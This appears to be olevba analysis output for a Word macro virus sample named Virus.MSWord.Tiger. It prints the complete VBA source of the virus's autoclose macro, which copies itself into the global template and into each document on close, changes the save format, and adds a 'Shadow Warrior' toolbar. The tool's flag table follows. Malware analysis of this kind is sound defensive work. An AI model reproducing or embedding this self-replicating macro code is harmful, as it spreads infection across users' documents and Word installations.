olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tiger-263f82cd44a9ba63689ca8acf02a93a5700610d7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tiger-263f82cd44a9ba63689ca8acf02a93a5700610d7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoclose.bas 
in file: Virus.MSWord.Tiger-263f82cd44a9ba63689ca8acf02a93a5700610d7 - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim f$
On Error Resume Next

WordBasic.NewToolbar "Spirit of the Shadow Warrior"
WordBasic.ViewToolbars Toolbar:="Spirit of the Shadow Warrior", Show:=1
WordBasic.DeleteButton "Spirit of the Shadow Warrior", 1
WordBasic.AddButton "Spirit of the Shadow Warrior", 1, 1, "autoclose", "Into a soul absolutely free from thoughts and emotions, even a tiger finds no room to insert its fierce claws...", 0, " 2 "


f$ = WordBasic.[FileName$]()

WordBasic.MacroCopy f$ + ":autoclose", "global:autoclose"
WordBasic.MacroCopy "global:autoclose", f$ + ":autoclose"

Dim s As Object: Set s = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs s
If s.Format = 0 Then
    s.Format = 1
    WordBasic.FileSaveAs s
End If

WordBasic.PrintStatusBar "If you want to be heard, sometimes you must be silent. - Shadow Warrior"

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

